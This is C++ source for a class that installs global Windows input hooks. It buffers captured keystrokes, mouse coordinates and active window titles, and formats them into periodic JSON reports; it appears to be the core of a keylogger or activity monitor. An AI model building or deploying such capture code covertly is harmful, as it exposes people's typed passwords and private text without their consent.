
#include "hardware.hpp"
#include <boost/locale/encoding_utf.hpp>

using namespace boost::locale::conv;

Hardware::Hardware(int idHook) : _idHook(idHook)
{
	reset();
}

bool Hardware::hook(HOOKPROC lpfn)
{
	if ((_handler = SetWindowsHookExW(_idHook, lpfn, NULL, 0)) == NULL)
		return false;
	return true;
}

void Hardware::unHook() const
{
	UnhookWindowsHookEx(_handler);
}

void Hardware::startWorking(const std::wstring &time)
{
	_isWorking = true;
	_startTime = time;
}

void Hardware::endWorking(const std::wstring &time)
{
	_isWorking = false;
	_endTime = time;
}

void Hardware::setActiveWindow(const std::wstring & activeWindowName)
{
	_lastActiveWindow = activeWindowName;
}

void Hardware::setX(const int x)
{
	_x = x;
}

void Hardware::setY(const int y)
{
	_y = y;
}

void Hardware::log(const std::wstring &txt)
{
	_buf += txt;
}

void Hardware::log(wchar_t log)
{
	_buf += log;
}

void Hardware::reset()
{
	_lastActiveWindow = L"";
	_startTime = L"";
	_endTime = L"";
	_buf = L"";
	_isWorking = false;
	_firstReport = true;
	_lastReport = false;
	_x = 0;
	_y = 0;
	_handler = NULL;
}

std::string Hardware::get_timed_report()
{
	wptree json_holder;
	if(_firstReport)
	{
		json_holder.put(L"start_time", _startTime);
		_firstReport = false;
	}
	if(_lastReport)
	{
		json_holder.put(L"end_time", _endTime);
		json_holder.put(L"active_window", _lastActiveWindow);
		_lastReport = false;
	}

	json_holder.put(L"content", _buf);
	// we clear the buf, so the next time
	// it has to send new info, without copying the old one
	_buf.clear();

	std::wostringstream buf;
	write_json(buf, json_holder, true);
	std::wstring result = buf.str();
	std::string wide_string_utf_result = utf_to_utf<char>(result);
	return wide_string_utf_result;
}

/*
** Getters
**/

bool Hardware::isWorking() const
{
	return _isWorking;
}

const std::wstring& Hardware::getLastActiveWindow() const
{
	return _lastActiveWindow;
}

const std::wstring& Hardware::getStartTime() const
{
	return _startTime;
}

const std::wstring& Hardware::getEndTime() const
{
	return _endTime;
}

const HHOOK& Hardware::getHandler() const
{
	return _handler;
}

const std::wstring& Hardware::getLog() const
{
	return _buf;
}

int	Hardware::getX() const
{
	return _x;
}

int	Hardware::getY() const
{
	return _y;
}